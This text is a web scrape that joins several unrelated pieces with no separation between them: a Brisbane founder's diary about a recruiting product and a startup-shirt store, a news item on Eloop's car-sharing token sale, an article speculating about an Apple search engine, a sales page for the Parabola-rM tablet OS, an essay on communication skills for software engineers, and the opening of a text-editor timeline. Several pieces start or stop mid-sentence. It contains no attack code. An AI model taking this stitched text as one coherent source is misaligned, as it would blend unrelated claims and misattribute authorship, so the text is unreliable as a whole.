<p><span>I was eager to get started, but I encountered my first problem.</span></p>
<p><span>I live in Brisbane, Australia. In my city, I’ve never met a startup big enough to need a dedicated marketing team.</span></p>
<p><span>What was my alternative?</span></p>
<p><span>I knew I had to get myself over to SF – the heart of the startup landscape.&nbsp;</span></p>
<p><span>From an outsiders perspective, there was an endless sea of opportunity there.</span></p>
<p><span>I booked my flights for May, then start cold emailing as many marketing recruiters as possible.</span></p>
<p><span>I shared the concept of my product and asked if they’d be interested in joining pre-launch.</span></p>
<p><span>Within a few weeks, I’d been on calls with recruiters from Intercom, Pinterest, Harry’s, and Tray.io.</span></p>
<p><span>My plan was to get these brands on board before launch – making the product more valuable when I release it to the public.</span></p>
<p><span>I didn’t expect to charge these initial brands. I was simply looking for validation.</span></p>
<p><span>On March 13th, I had a call with a recruiter from a startup that had recently raised a $50 million round.</span></p>
<p><span>She was looking to quickly scale her marketing team with quality candidates.</span></p>
<p><span>“This is exactly the kind of product I need right now”.</span></p>
<p><span>Then. The unbelievable happened.</span></p>
<p><span>“So, we’re obviously happy to pay you for the work you do with this. How much is it going to cost”.</span></p>
<p><span>I freeze.</span></p>
<p><span>I genuinely didn’t expect the call to veer this way.</span></p>
<p><span>I respond.</span></p>
<p><span>“Well. Umm. It’s free for any brands that join before launch, but later we can talk about paying for access to additional features I have in my backlog”.</span></p>
<p><span>WHAT. THE. FUCK.</span></p>
<p><span>I couldn’t explain how disappointed I was in myself. At the same time, I was at an all-time high.</span></p>
<p><span>I finally had early signs of validation.</span></p>
<p><span>This feeling only lasted a short week.&nbsp;</span></p>
<p><span>COVID came.</span></p>
<p><span>It didn’t spare anyone in the recruitment industry.</span></p>
<p><span>I was so close, but the timing couldn’t have been worse.</span></p>
<p><span>I knew this wasn’t going away for a long time.</span></p>


<hr>


<p><span><b>April 2020</b></span></p>
<p><span>Throughout isolation, I needed a project to keep me sane.</span></p>
<p><span>I decided to break my own rule and start building my product.</span></p>
<p><span>I knew this wasn’t a good use of my time, but what else was I going to do during COVID?</span></p>
<p><span><span>I build the</span> </span><a href="https://clickthrough.marketing/" target="_blank" rel="noopener"><span>site</span></a><span> in WordPress, then started working on SEO tasks. I was determined to use this downtime during COVID to build an organic growth machine.</span></p>
<p><span>I started building backlinks and publishing content. It’d been years since I had the chance to work on any SEO projects, so I used this time to up-skill my practical knowledge as a digital marketer.</span></p>
<p><span>In the space of four months, I managed to generate 142 high-quality backlinks, tripling my sites domain ranking.</span></p>


<div><figure><img data-attachment-id="3097" data-permalink="https://lachlankirkwood.com/2020/08/27/product-maker-journey/site-backlinks/" data-orig-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png" data-orig-size="1200,628" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Site-Backlinks" data-image-description="" data-medium-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png?w=300" data-large-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png?w=748" src="https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png?w=1024" alt="SEO backlink building timeline" srcset="https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png?w=1024 1024w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png?w=150 150w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png?w=300 300w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png?w=768 768w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/site-backlinks.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<p><span>As any SEO knows, building backlinks was an absolute slog.</span></p>
<p><span>This whole process involved writing original 2,000 – 3,000 word guest articles for some of the industries biggest publishers.</span></p>
<p><span>At the same time, I needed to also publish high-quality content to my own site to start ranking for keywords that would generate traffic.</span></p>
<p><span>Every second week, I’d publish a 5,000 article to my own site. You can check these out </span><a href="https://clickthrough.marketing/most-in-demand-marketing-skills-2020/" target="_blank" rel="noopener"><span>here</span></a> <span>and </span><a href="https://clickthrough.marketing/top-product-marketing-manager-interview-questions/" target="_blank" rel="noopener"><span>here</span></a><span>.</span></p>
<p><span>Surely enough, I started to burn out.</span></p>
<p><span>As someone that doesn’t enjoy writing, the thought of having to create another article started to make me feel sick.</span></p>
<p><span>I needed something else to temporarily work on.</span></p>


<hr>


<p><span><b>August 2020</b></span></p>
<p><span>I decided to take a day off and clean my house. I started clearing my wardrobe of the clothes I no longer wore.</span></p>
<p><span>It’d been years since I’d bought new clothes, so my wardrobe didn’t cater to my recent taste or personality.</span></p>
<p><span>As an overly passionate maker, I wanted to start wearing startup shirts throughout my everyday life.</span></p>
<p><span>The only problem, however, is that startups shirts are notoriously hideous and bold.</span></p>


<div><figure><img data-attachment-id="3100" data-permalink="https://lachlankirkwood.com/2020/08/27/product-maker-journey/startup-shirts/" data-orig-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png" data-orig-size="1200,628" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Startup-Shirts" data-image-description="" data-medium-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=300" data-large-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=748" src="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=1024" alt="Startup teeshirts" srcset="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=1024 1024w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=150 150w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=300 300w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=768 768w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<p><span>There it was. A new problem.</span></p>
<p><span>My solution…</span></p>
<p><span>Why don’t I just make my own?</span></p>
<p><span>I wanted to create a minimalist series of shirts that I could wear to any occasion. Whether I’m working at home, going out to dinner, or meeting with friends, these shirts needed to be discrete enough to match the rest of my wardrobe.</span></p>


<div><figure><img data-attachment-id="3122" data-permalink="https://lachlankirkwood.com/2020/08/27/product-maker-journey/ship-it-shirt/" data-orig-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png" data-orig-size="1920,1280" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Ship-It-Shirt" data-image-description="" data-medium-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=300" data-large-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=748" src="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=1024" alt="Maker Threads startup shirt" srcset="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=1024 1024w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=150 150w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=300 300w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=768 768w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<p><span>I jump online and print three of my own custom shirts. It costs me $75.</span></p>
<p><span>Then it hit me. I wonder if other makers like myself who experience this same problem.</span></p>
<p><span>I sent a photo to my friend who’s a software engineer, then tell him my idea.</span></p>
<p><span>His response.</span></p>

<p><span>It’s time to get to work, but this time I planned to be scrupulous about the process.</span></p>
<p><span>My goal was to spend a day validating this idea, then determine if it was something I should pursue.</span></p>
<p><span>If I couldn’t validate the concept, I’d return to posting blog content.</span></p>
<p><span>I spent a few hours creating some shirt designs in Canva.</span></p>
<p><span>Next, I was I’m ready to build my own online store.</span></p>
<p><span>I had to stop myself there.</span></p>
<p><span>If I’m building a Shopify store, I’ll need to buy a domain, design the store itself, then pay for a Shopify subscription.</span></p>
<p><span>This would consume too much time and money. After all, I’m only seeking validation.</span></p>
<p><span>I head to Teespring. I upload my designs to their print-on-demand store and use their default storefront.</span></p>
<p><span>I give it a basic name (Maker Threads) and spend two minutes designing a logo,</span></p>
<p><span>At this point, the store doesn’t look like anything special. I didn’t even have my own custom domain.</span></p>

<p><span>If users truly saw the value in my product, I should be able to sell just one shirt to validate the idea.</span></p>
<p><span>As a digital marketer, the old me would have happily thrown $100 behind some Facebook ads to acquire these customers. This time, I wasn’t going to let myself spend a dollar.</span></p>
<p><span>On a Sunday night (AEST), I launch the store on Product Hunt and with zero expectations.</span></p>
<p><span>Like most small makers, every Product Hunt launch I’ve shared in the past has amassed to no traction.</span></p>
<p><span>This time was different.</span></p>

					<p>One year ago, the Austrian startup <a href="https://eloop.at/">Eloop</a> started its sharing service for e-cars in Vienna – and was already communicating back then: The intention was to enable users to invest in the e-vehicle fleet via blockchain and cryptocurrencies and to give them a share of the revenue. Now the time has come: At a token sale starting today, interested parties can buy the new <a href="https://eloop.one/">Eloop One Token</a> (EOT).</p>
<p>Anyone who owns tokens will be able to participate in the startup’s revenues. „The term ‚car sharing‘ currently stands for app-based car rentals. We want to translate the meaning of sharing implied in the term into reality by sharing not only our e-cars with citizens, but also the revenues,“ says Leroy Hofer, one of Eloop’s co-founders and CEO. „Anyone who has one of these tokens is making money from car-sharing rides.“ The revenue share can either be paid out in Euros or converted into credits for the car sharing service.</p>
<h2>„Asset Backed Token“</h2>
<p>The tokens, which by the way are not based on Ethereum like many others, but on the 0bsnetwork, were designed as security tokens, i.e. a digitalized version of a security. „This protocol was used for various reasons. Some of the most important reasons were the low network fees, the network speed and proof of stack. Low fees and high speed are essential for efficient implementation, since a large number of micro-transactions are involved. The protocol also allows smart tokens and smart accounts,“ Hofer says.</p>
<p>More precisely, EOTs are so-called „asset-backed tokens“; in total, there are initially exactly 240,000 EOTs. „The value corresponds to four BMW i3s that are already in our car-sharing fleet at Eloop,“ says Hofer. „These cars were tokenized, i.e. they are displayed on the blockchain using EOT. Depending on user demand, more cars will be tokenised gradually, which will also increase the token supply. As a buyer of a token (exactly one Euro per token is required) you get a fraction of a car. If the car generates revenue via car sharing, this is distributed proportionally to the owners of the tokens.</p>
<h2>Tokenization of Assets</h2>
<p>The tokenization of a wide variety of assets is a trend that has been spreading recently. For example, in Security Token Offerings (STOs), the shares of companies are represented in tokens. In Austria, <a href="https://www.trendingtopics.at/blockpit-sto-2-5-millionen-euro/">Blockpit</a> and <a href="https://www.trendingtopics.at/bluepower-security-token-offering-wind-energy/">Blue Power</a>, for example, have carried out STOs in order to raise money from investors – in return, tokens were issued. <a href="https://www.trendingtopics.at/black-manta-capital-security-tokens-statt-aktien-mit-segen-der-finanzaufsicht/">Black Manta Capital</a>, in turn, has received the blessing of the financial supervisory authorities in Germany to enable small investors to invest in luxury apartments in Berlin via tokens . The Eloop tokens are also classified as Security Token – the young company was advised by the law firm DLA Piper.</p>
<p>At Eloop, the shares in an electric car are now displayed as tokens. In a first step, 240,000 EOTs will be sold at one euro each, bringing in 240,000 euros. When new electric cars are added to the fleet, more tokens can be created to bring the new vehicles onto the blockchain. The current token sale runs until end of December or until all tokens have been sold. Later, the EOTs should also be able to be traded on crypto exchanges. They will then be subject to pricing on the crypto-market – and their value may rise as well as fall. This is another thing you should keep in mind when you want to invest.</p>

The deal ensures that iPhone, iPad, and Mac users search with Google when they use Safari. That is unless they manually change the default search engine in Safari’s preferences.</p><p>The deal between Apple and Google may be coming to an end soon. In July 2020, Reuters reported that the U.K. Competition and Markets Authority was <a href="https://www.reuters.com/article/us-apple-google/uk-regulators-take-aim-at-apples-search-engine-deal-with-google-idUSKBN242748">taking aim at the deal</a>.</p><blockquote><p>Given the impact of preinstallations and defaults on mobile devices and Apple’s significant market share, it is our view that Apple’s existing arrangements with Google create a significant barrier to entry and expansion for rivals affecting competition between search engines on mobiles.</p><cite>U.K. Competition and Markets Authority Report</cite></blockquote><p>If the U.K. regulators take action, there may be a ripple effect from the European Union, which has a history of <a href="https://en.wikipedia.org/wiki/European_Union_vs._Google">going after Google for anti-competitive behavior</a>. Regulators in Europe may force Apple to remove Google as the default search engine and have users choose which search engine they want to use when they first launch Safari.</p><h2>Why Apple might be launching a search engine</h2><p>Regulatory pressure, a contentious relationship with Google, and the maturation of Apple’s Siri and iCloud are presenting an opportunity for Apple to create and launch a search engine. There are several signs right now that indicate Apple may be doing just that.</p><h3>Apple doesn’t need Google’s money</h3><p>Apple is now the world’s most valuable company. They may want the money Google gives them, but they don’t need it.</p><h3>Apple is pouring resources and money into search</h3><p>Apple is investing heavily in search, as shown in their <a href="https://jobs.apple.com/en-us/search?search=search%20engineer&amp;sort=relevance">job postings for search engineers</a>. The job listings reveal they incorporate AI, ML, NLP, and more into all of their services and apps.</p><h3>iOS and iPadOS 14 beta bypasses Google Search with Spotlight Search</h3><p>It’s not clear if Apple uses Bing anymore, as results are labeled only as Siri Suggestions. It is clear that Apple has started to return search results within Spotlight Search and is <a href="https://www.coywolf.news/seo/ios-ipados-14-spotlight-search-google-threat/">completely bypassing Google</a> altogether.</p> <stream src="ce5235df57f7501f313fe1eeada06ece" poster="https://videodelivery.net/ce5235df57f7501f313fe1eeada06ece/thumbnails/thumbnail.jpg?time=7s" preload="" autoplay="" loop="" mute=""></stream>  <h3>Apple recently updated its Applebot web crawler page</h3><p>In July 2020, Apple published a significant update to its <a href="https://support.apple.com/en-us/HT204683">About Applebot support page</a>. The additions are very similar to the details Google provides to <a href="https://www.coywolf.news/topics/webmaster/">webmasters</a> and <a href="https://www.coywolf.news/topics/seo/">SEOs</a>. Here are the changes they made to the Applebot support page.</p><ul><li>Added how to verify traffic from Applebot</li><li>Expanded details on the Applebot user agent, including differences between its desktop and mobile version</li><li>Expanded robots.txt rules</li><li>Added a section stating that they don’t just crawl HTML, but also render pages similar to Google</li><li>Added a section on search rankings and the factors that affect how it ranks web search results</li></ul><h3>Applebot has been busy crawling sites</h3><p>Checking my server logs on <a href="https://coywolf.io/wpengine">WP Engine</a> revealed that Applebot had been regularly crawling my sites daily, something I haven’t noticed until now.</p><figure><img loading="lazy" width="1820" height="1563" src="https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files.png" alt="" srcset="https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files.png 1820w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-300x258.png 300w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-1024x879.png 1024w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-768x660.png 768w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-1536x1319.png 1536w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-734x630.png 734w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-150x129.png 150w" sizes="(max-width: 1820px) 100vw, 1820px"><figcaption>Server log of Applebot crawling Coywolf News</figcaption></figure><h2>What Apple has to gain from launching a search engine</h2><p>A search engine from Apple will likely look and function slightly different from modern search engines like Google, Bing, and DuckDuckGo. That’s because Apple historically likes to do things differently, and their search engine will serve a different purpose than showing ads and data mining.</p><p>Based on Apple’s numerous search engineer job descriptions, and the continued consolidation of web and app results in Spotlight Search, an Apple search engine will likely function as a highly personalized data hub. It will be similar to Google Assistant on Android, but different since it (initially) won’t have ads, will be completely private, and have significantly deeper integrations with the OS.</p><p>One can imagine getting easy buy-in from users if they benefit from privacy, coupled with the seamless integration and personalization of their iCloud data. Apple can leverage AI and ML to deliver search results based on their email, messages, maps, events, reminders, notes, photos, files, contacts, music, news, TV shows and movies, third-party apps, documents, and more. And they can do it without ads and with the promise of real data privacy.</p><p>Apple has a lot to gain from this model. Some of the main benefits include:</p><ul><li>The promotion of apps in search results that will benefit Apple’s services and detract from <a href="https://coywolf.pro/webmaster/progressive-web-app-pwa/">Google’s push towards PWAs</a>.</li><li>A weakening of Google’s monopoly on search and a significant blow to its ad revenue and data mining.</li><li>The promotion of Apple products and services. Including struggling services like Apple News+ and Apple TV+.</li><li>Continued control and lock down of the Apple ecosystem. Users will become dependent on personalized search results with deep service and product integrations that are only possible via their search engine.</li><li>The extension of their ad serving platform will allow app developers to promote their apps in search results.</li></ul><h2>What will this mean for SEO?</h2><p>If Apple can capture enough market share, it will force SEOs to adapt and optimize for their search engine. In some ways, at least based on their Applebot documentation, tactics will remain the same. But SEOs can also expect to test and discover new opportunities that aren’t possible with Google or other modern search engines.</p><p>At this point, everything is based on observation and conjecture. They may never release a search engine. It’s also possible that iOS, iPadOS, and macOS users will be using it and not even be aware of it. It could be so tightly integrated into the operating system and native apps that alerts and Spotlight Searches slowly steal away queries that would have otherwise been made on Google.</p><h2>Never miss an important story</h2><p>Weekly news updates, no spam, and you can unsubscribe anytime.</p> <div><p><img alt="" src="https://secure.gravatar.com/avatar/93d2d6e6492828a2f1f427dddc413f4b?s=120&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/93d2d6e6492828a2f1f427dddc413f4b?s=240&amp;d=mm&amp;r=g 2x" height="120" width="120" loading="lazy"></p><div><p><a rel="author" href="https://www.coywolf.news/jon-henshaw/">Jon Henshaw</a></p><p><small>Jon is the founder and Managing Editor of Coywolf.

<p>Parabola-rM (PRM) turns a reMarkable e-paper tablet into a laptop. It is a <a href="https://www.fsf.org/about/what-is-free-software">free</a> operating system that replaces the manufacturer's proprietary OS. With it, one may author code, write documents, edit spreadsheets, and do everything that one may do with an ordinary graphical operating system.</p>

<p>All reMarkable hardware works except for the Wi-Fi radio because it requires proprietary firmware. The electrophoretic display supports fast partial refreshing. The EMR digitizer and touchscreen work. The facial buttons work. The power button turns the device on and off, and the power mode can be suspended and come back. External peripherals are supported with USB OTG. Heck, there is even a battery monitor in the desktop's status bar.</p>

<h2>Parabola on reMarkable: A Guide</h2>
<p>The <a href="http://www.davisr.me/projects/parabola-rm/install-guide-latest.pdf">extended installation manual</a> is available at no charge and covers how to install Parabola GNU/Linux-libre from-scratch. It is recommended to read this, and be comfortable with the process outlined, before purchasing the OS images.</p>


<h2>Download the distribution images</h2>
<p>PRM may be purchased for $20 (USD). Half of the proceeds will be split between the <a href="https://www.fsf.org/">Free Software Foundation</a> and the <a href="https://www.parabola.nu/">Parabola Project</a>. With purchase, a customer will receive a <code>.tar</code> archive of the following, and 6 months of PRM OS updates.</p>
<ul>
	<li>Compiled Parabola-rM OS image, plus bootloader image suitable for immediate transfer</li>
	<li>Compiled versions of <em>imx_usb</em> for FreeBSD, GNU/Linux, and Windows (64-bit)</li>
    <li>Installation manual as PDF, HTML, and LaTeX</li>
    <li>Support files referenced in the manual</li>
    <li>Be entitled to some support via email</li>
</ul>

<p>A <a href="http://www.davisr.me/projects/parabola-rm/install-guide-latest.pdf">PDF of the extended installation manual</a> is available at no charge. It is recommended that one peruse it before making a purchase. With these OS images, one does not need to follow the whole process: just <code>dd</code> the images over the <code>/dev/mmcblk1boot0</code> and <code>/dev/mmcblk1</code> block devices. However, it provides useful context.</p>

<p>I am an independent developer, and I unfortunately cannot offer a warranty. Although I've not damaged my tablet with this software, I cannot make any guarantees this won't break yours. This software is sold as-is, without warranty, with no guarantees and no refunds. I will use the funds gathered here to author free, on-device handwriting recognition software.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Software engineers will spend years looking at code, without thinking about their communication skills. However, software engineering is more than just programming. The reality is that technical ability can only take someone so far. Once you hit the technical ceiling, it becomes about communication.</p><p>In this post, I'm going to talk about communication and why it's important. I'll share with you the three domains of communication and decision-making. These domains will give you the tools to take your problem-solving skills and apply them to matters of communication.</p><h2></h2><p>Of course! An engineer can only get so far with technical ability alone. When we look at a job description from Google for a Software Engineer, we see the following:</p><ol><li><b>Degree or equivalent practical experience in computer science.</b></li><li><b>Experience in working with the programming languages and frameworks we use.</b></li><li><b>Working proficiency and communication skills.</b></li></ol><p>These are the minimum skills required to become a software engineer. Technical ability is the basis for early career development. If you want to continue growing, you need to break past the technical ceiling. Let's look at the added requirements for a Staff Software Engineer position:</p><ol><li><b>Experience architecting and developing distributed systems design.</b></li><li><b>Hands on technical leadership experience leading project teams and setting technical direction.</b></li></ol><p>From these postings, we can see that technical ability can only get you halfway there. Communication skills are required for basic tasks like code reviews and collaboration. These are just the minimum skills required.</p><p>Beyond entry-level tasks, higher-level tasks require more strategic and tactical communication. Architecture requires strategizing a systems design through research, implementation, and working with others to oversee the process. Technical leadership requires essential communication skills to be able to direct and influence the group. Without developing these skills, an engineer can only go so far.</p><p>That's why we need communication: to grow. We need communication to take our technical abilities to new heights. These essential skills increase our ability to work with others and broaden our impact. To build these skills, we need to be more thoughtful, and we need to know which domains to think over.</p><h2></h2><p>Thoughtfulness and decisionmaking for software engineers can be broken down into three domains:</p><ol><li><b>Technical</b></li><li><b>Organizational</b></li><li><b>Operational</b></li></ol><p>Engineers are already familiar with the technical domain. Many find their ceilings here because it's easy to be distracted by matters of code. However,  to break past that ceiling, an engineer needs to exercise critical thinking in all three domains. </p><div data-id="4YFSBdUgLZsmte7jkBJX2P"><picture loading="lazy"><source srcset="https://images.ctfassets.net/f1aa79r6xovt/4YFSBdUgLZsmte7jkBJX2P/8b1416fb8ed5229c767558dcbb56e049/joshua-aragon-EaB4Ml7C7fE-unsplash.jpg?fm=webp&amp;w=700" type="image/webp"><img src="https://images.ctfassets.net/f1aa79r6xovt/4YFSBdUgLZsmte7jkBJX2P/8b1416fb8ed5229c767558dcbb56e049/joshua-aragon-EaB4Ml7C7fE-unsplash.jpg?fm=jpg&amp;w=700" alt="A laptop with a code editor open."></picture></div><h3></h3><p>Writing code is easy, but figuring out which code to write is not. For any given feature, we could write it a hundred different ways. And while there is no "right" way to write it, we can strive towards <a href="https://cole.codes/posts/hard-to-read-coding-with-communication">writing code that is easier to read and maintain</a>. Every line is a choice that makes tradeoffs to strive towards a healthier codebase.</p><p><em>So what makes a healthy codebase?</em></p><p><b>A healthy codebase has a good balance of the following:</b></p><ul><li>Clarity</li><li>Direction</li><li>Consistency</li></ul><p>A healthy codebase has <b>clarity</b>, where new changes are easy to implement against a known path. Implementing new routes, creating new interfaces, and deploying new APIs; tasks like these are straightforward. Struggles in clarity happen when a codebase has too many layers of redirection, multiple mechanisms for the same task, or insufficient tooling and documentation. These together can help make the codebase more accessible to all contributors.</p><p>A healthy codebase has a path forward, called <b>direction. </b>When considering <i>tech debt, </i>the deferred cost of a short-term solution, a healthy codebase is well-documented and guarded by tooling that helps the developer to be productive. A good sense of direction is when tech debt is easy to silo so that it does not impact the rest of the codebase. </p><p>Lastly, a healthy codebase has <b>consistency</b> in its use of patterns. This means that what happens in one place of the codebase, is expected to happen elsewhere. Consistency is a spectrum where patterns align together. When there are many contributors over time, multiple patterns can emerge. Inconsistencies can also emerge when introducing new tooling or patterns. On the other hand, these are only problems when there is a lack of clarity or direction in the codebase.</p><p>A healthy codebase has a healthy balance of all three devices: clarity, direction, and consistency. When talking through the technical domain, these devices are useful tools for expressing the impact of technical decisions. However, engineers also need to think beyond the codebase. After all, the choices we make have an impact on the whole team.</p><div data-id="lcPTM12lFZQXYNUAZn1NZ"><picture loading="lazy"><source srcset="https://images.ctfassets.net/f1aa79r6xovt/lcPTM12lFZQXYNUAZn1NZ/defb2f91a9d53e9c4fb5d36811344187/kate-sade-2zZp12ChxhU-unsplash.jpg?fm=webp&amp;w=700" type="image/webp"><img src="https://images.ctfassets.net/f1aa79r6xovt/lcPTM12lFZQXYNUAZn1NZ/defb2f91a9d53e9c4fb5d36811344187/kate-sade-2zZp12ChxhU-unsplash.jpg?fm=jpg&amp;w=700" alt="An empty office with a dozen office chairs lined in cubicles."></picture></div><h3></h3><p>An <i>organization</i> is a group of people or a company. In engineering, an organization could mean multiple groups of people: the whole company, a specific team, or a group of code owners. The decisions that engineers make affect more than the codebase — they affect these groups of people too. Being thoughtful about the organization is helpful for making better decisions to benefit these groups.</p><p>The <b>organizational domain </b>is where thoughtfulness and decisionmaking can impact these groups. An engineer exercises this domain when starting inward and reflecting outward on how decisions impact their peers and collaborators. Consider a codebase as a product of its own. Reflect on the users of this product, contributors to the code.</p><p><b>To reflect in this domain, we can ask the following questions:</b></p><ul><li>Who will maintain this decision in the short-term?</li><li>How will this decision be adopted by external contributors?</li><li>What impact does this decision have to make future decisions?</li><li>When is the right time to make this decision?</li></ul><p>The final question to ask, considering the inputs above, is: <i>why?</i> When we ask why we're considering the tradeoffs being made in the organizational domain. Finally, when we ask this question we also need to ask the inverse: <i>why not?</i> </p><p>Thinking through these problems is how engineers elevate their problem-solving skills to the organization. Reflecting on how decisions impact these groups of people, is how engineers become more effective. The organizational domain is how engineers apply their problem-solving skills to the needs of the group. This takes us into our next domain, where we apply problem-solving skills to operations.</p><div data-id="2yt7UuYW8BY4BKinRLFJHC"><picture loading="lazy"><source srcset="https://images.ctfassets.net/f1aa79r6xovt/2yt7UuYW8BY4BKinRLFJHC/8773164bc37388265d1496efd05e4ecd/isaac-smith-6EnTPvPPL6I-unsplash.jpg?fm=webp&amp;w=700" type="image/webp"><img src="https://images.ctfassets.net/f1aa79r6xovt/2yt7UuYW8BY4BKinRLFJHC/8773164bc37388265d1496efd05e4ecd/isaac-smith-6EnTPvPPL6I-unsplash.jpg?fm=jpg&amp;w=700" alt="A chart demonstrating growth."></picture></div><h3></h3><p>The final domain we will cover is <b>the operational domain</b>. This domain is where problem-solving skills are applied to the impact on <i>processes</i>. The previous domains (technical and organizational) have so far focused on <i>things</i> and <i>people</i>. In this domain, we focus on the impact on things and people over time.</p><p>When working in product development, we often talk about <a href="https://cole.codes/posts/the-minimum-viable-product-mvp">how to build a minimum viable product.</a> The first process is the one in which we brainstorm and plan before building. In this process, we talk about the <i>scope </i>of the development, meaning what's included. In this process, it's also helpful to ask: what's not included? Through this process, engineers collect a list of <i>requirements</i>, the needs of the development to fulfill the scope. Together, scope and requirements are useful tools for talking about the development process.</p><p>What about the processes that happen after the code is written? Writing the code is easy, however, <b>engineers should be mindful of the following technical process that happen afterward:</b></p><ul><li>Code Review</li><li>Building and Deployment</li><li>Integration into the Mainline</li></ul><p>In addition to these processes, our thoughtfulness and decisions can have latent effects that impact how we implement and integrate in the future. <b>Moreover, there can be effects on the organizational and operational processes, such as:</b></p><ul><li>Who needs to be involved in the decision-making process? </li><li>How does the scope today affect the requirements for tomorrow?</li><li>What requirements can better prepare any incremental efforts?</li><li>Are there opportunities to generalize the approach to scale for other initiatives?</li><li>After the decision is settled, who needs to be informed?</li></ul><p><b>Questions like these are effective tools for communication and reflection. </b>When communicating in product development, asking these questions can help make an engineer more effective in the process. Reflecting on these answers will also make you a more critical thinker that can influence others at the table.</p><h3></h3><p>This framework of thinking is effective for software engineers to become more thoughtful and productive. Being thoughtful about the technical, organizational, and operational domains — will give you the tools to level up as a developer. Effective engineering is not writing the perfect code, but rather identifying how to apply problem-solving skills throughout the entire process. Harnessing communication in your career will help you become more impactful and influential beyond technical ability. The T.O.O framework reconciles these two areas to help you think through the domains and harness communication as a skill.</p><p>Photos by <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@goshua13">Joshua Aragon</a>, <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@kate_sade">Kate Sade</a> and <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@isaacmsmith">Isaac Smith</a>.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Every so often my programming productivity takes a steep dive as I try to use a new text editor. </p>
<p>Why do I put myself through this? Simply put, I'm a bit of an efficiency fanatic. Fanatic in the sense of pursuing some end with not-entirely-rational vigor and passion. I call it fanatical because the pursuit of ever more efficiency in and of itself takes quite a bit of time, thus actively working against my ostensible goal of being more productive.</p>
<p>Whatever, it's a hobby.</p>

<p>Let's make a timeline. </p>
<h2><code>2011</code> Dreamweaver</h2>
<p>Oh yeah, I started there. This was when I first started learning web development and thought to myself "It's just text and images, how much harder than Word could it be?"</p>
<p>I'm not putting Dreamweaver down—it was actually a very good start. There were professional video tutorials about it since it was part of the Adobe suite. It even had code mode, which is just like any normal text editor.</p>
